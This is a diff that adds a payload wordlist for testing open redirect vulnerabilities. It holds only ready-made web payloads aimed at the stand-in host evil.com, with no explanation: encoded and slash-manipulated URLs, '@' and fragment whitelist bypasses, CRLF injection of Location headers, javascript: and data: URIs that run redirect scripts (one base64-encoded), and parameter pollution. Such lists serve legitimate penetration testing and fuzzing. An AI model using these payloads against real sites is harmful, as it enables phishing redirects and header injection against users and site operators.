@@ -1,0 +1,78 @@
+# Open Redirect Payloads
+# Payloads for testing open redirect vulnerabilities
+
+# Basic redirects
+http://evil.com
+https://evil.com
+//evil.com
+/\evil.com
+\/evil.com
+
+# Protocol-relative
+//evil.com
+\\evil.com
+/\\evil.com
+\\/evil.com
+
+# URL encoded
+http%3A%2F%2Fevil.com
+https%3A%2F%2Fevil.com
+%2F%2Fevil.com
+%5C%5Cevil.com
+
+# Double encoded
+http%253A%252F%252Fevil.com
+%252F%252Fevil.com
+
+# Authentication bypass attempts
+http://trusted.com@evil.com
+https://trusted.com@evil.com
+http://evil.com%23trusted.com
+http://evil.com%2523trusted.com
+http://evil.com?trusted.com
+
+# Slash manipulation
+/evil.com
+/.evil.com
+/../evil.com
+/./evil.com
+/./../evil.com
+
+# Subdomain confusion
+http://trusted.com.evil.com
+http://trustedcom.evil.com
+
+# CRLF injection
+%0d%0aLocation: http://evil.com
+%0aLocation: http://evil.com
+%0dLocation: http://evil.com
+
+# JavaScript redirects
+javascript:location='http://evil.com'
+javascript:document.location='http://evil.com'
+javascript:window.location='http://evil.com'
+
+# Data URI redirect
+data:text/html,<script>location='http://evil.com'</script>
+data:text/html;base64,PHNjcmlwdD5sb2NhdGlvbj0naHR0cDovL2V2aWwuY29tJzwvc2NyaXB0Pg==
+
+# Case manipulation
+HTTP://evil.com
+HTTPS://evil.com
+hTTp://evil.com
+HTtP://evil.com
+
+# Missing protocol
+evil.com
+www.evil.com
+
+# IPv4 and IPv6
+http://1.2.3.4
+http://[::1]
+
+# Whitelisting bypass with fragments
+http://evil.com#expected.com
+http://evil.com#/expected-path
+
+# Parameter pollution
+?url=http://trusted.com&url=http://evil.com
